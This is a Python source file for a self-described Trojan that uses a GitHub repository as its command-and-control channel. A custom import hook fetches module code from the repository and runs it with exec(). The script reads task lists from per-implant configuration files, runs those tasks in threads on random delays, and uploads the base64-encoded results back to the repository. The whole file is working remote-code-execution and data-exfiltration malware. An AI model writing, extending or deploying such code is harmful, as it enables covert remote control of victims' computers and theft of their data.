import base64
import github3
import github3.repos
import importlib.util
import json
import random
import sys
import threading
import time
from datetime import datetime
from github3.repos.contents import Contents

def github_connect(token_path='token.txt', owner='ybvy', repo='bhptrojan') -> github3.repos.Repository:
    """Connects to the GitHub repository."""
    with open(token_path) as f:
        token = f.read().strip()
    return github3.login(token=token).repository(owner, repo)

def get_file_content(dir_name, module_name, repo: github3.repos.Repository) -> bytes:
    """Fetch file content from GitHub repository."""
    file: Contents = repo.file_contents(f"{dir_name}/{module_name}")
    return file.decoded

class GitImporter:
    """Custom module loader to fetch and execute modules from GitHub."""
    def __init__(self, repo):
        self.current_module_code = ""
        self.repo = repo

    def find_module(self, name, path=None):
        print(f"[*] Attempting to retrieve {name}")
        try:
            new_lib = get_file_content('modules', f'{name}.py', self.repo)
            if new_lib:
                self.current_module_code = new_lib.decode('utf-8')  
                return self
        except Exception as e:
            print(f"[!] Error retrieving module {name}: {e}")
        return None

    def load_module(self, name):
        if name in sys.modules:
            return sys.modules[name]

        spec = importlib.util.spec_from_loader(name, loader=None)
        new_module = importlib.util.module_from_spec(spec)

        try:
            exec(self.current_module_code, new_module.__dict__)
        except SyntaxError as e:
            print(f"[!] Syntax error in module {name}: {e}")
            return None 

        sys.modules[name] = new_module
        return new_module

class Trojan:
    """Main Trojan class to manage module execution."""
    def __init__(self, id, repo):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = repo

    def get_config(self):
        """Fetches the configuration file and imports required modules."""
        try:
            config_json = get_file_content('config', self.config_file, self.repo)
            config = json.loads(config_json)

            for task in config:
                if task['module'] not in sys.modules:
                    __import__(task['module']) 

            return config
        except Exception as e:
            print(f"[!] Error loading config: {e}")
            return []

    def module_runner(self, module):
        """Runs a specified module and stores the result."""
        try:
            result = sys.modules[module].run()
            self.store_module_result(result)
        except Exception as e:
            print(f"[!] Error running module {module}: {e}")

    def store_module_result(self, data):
        """Stores module execution results in the repository."""
        try:
            message = datetime.now().isoformat()
            remote_path = f'data/{self.id}/{message}.data'
            bindata = bytes('%r' % data, 'utf-8')
            self.repo.create_file(remote_path, message, base64.b64encode(bindata))
        except Exception as e:
            print(f"[!] Error storing result: {e}")

    def run(self):
        """Continuously fetches config and runs tasks."""
        while True:
            config = self.get_config()
            for task in config:
                threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)
                ).start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30*60, 3*60*60))

repo = github_connect()

if __name__ == "__main__":
    sys.meta_path.append(GitImporter(repo))
    Trojan('abc', repo).run()
